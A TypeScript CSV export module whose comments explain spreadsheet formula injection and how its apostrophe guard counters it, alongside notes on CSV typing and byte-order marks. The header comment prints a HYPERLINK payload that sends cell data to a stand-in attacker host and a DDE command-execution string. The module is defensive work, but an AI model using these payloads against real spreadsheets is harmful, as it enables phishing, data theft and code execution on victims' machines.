/**
 * Ordence — ⭐⭐ CSV, RFC 4180, AND THE TWO THINGS CSV CANNOT DO
 * Version: v1.73.0-alpha · Wave 5
 *
 * ══════════════════════════════════════════════════════════════════════
 * 🔴 THE SECURITY PROBLEM NOBODY THINKS OF AS ONE
 * ══════════════════════════════════════════════════════════════════════
 * A cell beginning `=`, `+`, `-`, `@`, TAB or CR is a FORMULA to Excel,
 * Google Sheets and LibreOffice. A customer name of
 *
 *     =HYPERLINK("https://evil.example/"&A1,"Click for invoice")
 *
 * typed into a contact form by anybody, exported by an accountant and
 * opened on a finance machine, is a working phish with the victim's own
 * data interpolated. `=cmd|'/c calc'!A1` is the executable version, and
 * DDE is still enabled by default in enough estates to matter.
 *
 * ⭐ THE DEFENCE, AND IT IS DELIBERATELY VISIBLE: a leading apostrophe on
 * a TEXT cell that starts with one of those characters, and a NOTE saying
 * how many cells were changed. Silently altering the customer's data
 * would be its own defect; altering it and saying so is a trade the
 * reader can check.
 *
 * ⚠️ NUMBER CELLS ARE NEVER TOUCHED, and they cannot carry a payload:
 * `lib/export/values.ts` emits them as `/^-?\\d+(\\.\\d+)?$/` and nothing
 * else, so `-500` stays a negative number and `-500+cmd|…` cannot occur.
 * Escaping numbers would turn every negative amount in the ledger into
 * text, which is how a "security fix" breaks a trial balance.
 *
 * ══════════════════════════════════════════════════════════════════════
 * ⚠️ AND THE FIDELITY PROBLEM CSV SIMPLY HAS
 * ══════════════════════════════════════════════════════════════════════
 * CSV has no types. An invoice number `0012345` becomes `12345` in Excel
 * and a 15-digit GSTIN becomes `1.23457E+14`, and NOTHING THIS WRITER CAN
 * DO PREVENTS IT — a leading apostrophe is not stripped on CSV import, it
 * becomes part of the value, so the "fix" hands the customer a GSTIN with
 * a quote in it that their portal rejects.
 *
 * So this writer does not pretend. When a dataset has `code` columns it
 * says so in a note and names XLSX as the format that survives, and
 * `lib/export/registry.ts` declares CSV lossy for `code` so the picker
 * can warn BEFORE the download rather than after.
 */

import type { Dataset } from "./types";
import { assertDatasetIsRenderable, cellText, renderCell } from "./values";

/** RFC 4180 says CRLF. Excel on Windows still cares. */
const EOL = "\r\n";

/**
 * 🔴 THE CHARACTERS THAT START A FORMULA. TAB and CR are in the list
 * because both survive a paste into a cell and both leave the payload as
 * the first visible character.
 */
const FORMULA_STARTERS = new Set(["=", "+", "-", "@", "\t", "\r"]);

export function needsFormulaGuard(text: string): boolean {
  return text.length > 0 && FORMULA_STARTERS.has(text[0]!);
}

function quote(field: string): string {
  /**
   * ⚠️ ALWAYS QUOTED IS NOT THE SAME AS SOMETIMES QUOTED, AND SOMETIMES
   * IS WHAT BREAKS. A field containing a comma, a quote, a newline or a
   * leading space must be quoted; deciding case by case is where a writer
   * gets it wrong on the one row that has an address in it. Quoting
   * everything is two bytes larger and cannot be wrong.
   */
  return `"${field.replace(/"/g, '""')}"`;
}

export type CsvResult = {
  readonly text: string;
  readonly notes: readonly string[];
  /** How many cells received the apostrophe. Zero on almost every export. */
  readonly guardedCells: number;
};

export function datasetToCsv(
  dataset: Dataset,
  options: { readonly includeNotes?: boolean } = {},
): CsvResult {
  assertDatasetIsRenderable(dataset);

  const lines: string[] = [];
  const notes: string[] = [];
  let guardedCells = 0;

  const codeColumns = dataset.columns.filter((c) => c.kind === "code");
  if (codeColumns.length > 0) {
    notes.push(
      `CSV has no cell types. ${codeColumns.map((c) => c.label).join(", ")} ` +
        `${codeColumns.length === 1 ? "is a code" : "are codes"} — leading zeroes and long digit ` +
        `strings are altered by Excel on open, and no CSV can prevent it. Export as XLSX if this ` +
        `file is going to be opened in a spreadsheet.`,
    );
  }

  /**
   * ⚠️ NOTES GO ABOVE THE HEADER AND ARE COMMENTED WITH `#`. Not a CSV
   * standard — there is no comment in RFC 4180 — but every importer that
   * matters skips them or shows them as one column, and a caveat that is
   * not in the file is a caveat the auditor never sees. `includeNotes:
   * false` produces a machine-clean file for the importers that do not.
   */
  if (options.includeNotes !== false) {
    for (const note of [...(dataset.notes ?? []), ...notes]) {
      lines.push(`# ${note.replace(/[\r\n]+/g, " ")}`);
    }
  }

  lines.push(dataset.columns.map((c) => quote(c.label)).join(","));

  for (const row of dataset.rows) {
    const fields = dataset.columns.map((column) => {
      const cell = renderCell(dataset, column, row);
      if (cell.kind === "number") return cell.literal;
      let text = cellText(cell);
      if (needsFormulaGuard(text)) {
        text = `'${text}`;
        guardedCells += 1;
      }
      return quote(text);
    });
    lines.push(fields.join(","));
  }

  if (guardedCells > 0) {
    notes.push(
      `${guardedCells} text cell${guardedCells === 1 ? "" : "s"} began with a character that a ` +
        `spreadsheet reads as the start of a formula, and ${guardedCells === 1 ? "was" : "were"} ` +
        `prefixed with an apostrophe so the value is displayed rather than executed.`,
    );
  }

  return { text: lines.join(EOL) + EOL, notes, guardedCells };
}

/**
 * ⚠️ THE BYTE-ORDER MARK IS OPT-IN AND IT IS NOT COSMETIC. Excel on
 * Windows reads a CSV without one in the system code page, so a Devanagari
 * or Tamil name arrives as mojibake and a customer concludes the product
 * mangled their data. Excel reads a CSV WITH one as UTF-8.
 *
 * 🔴 AND IT BREAKS SOME IMPORTERS. A naive parser reads the BOM as part
 * of the first column heading, so `id` becomes `﻿id` and the mapping
 * silently misses. Hence: default ON for a human download, and the
 * machine-facing paths pass `bom: false`.
 */
export function csvBytes(text: string, options: { readonly bom?: boolean } = {}): Uint8Array {
  const withBom = options.bom !== false ? `﻿${text}` : text;
  return new TextEncoder().encode(withBom);
}
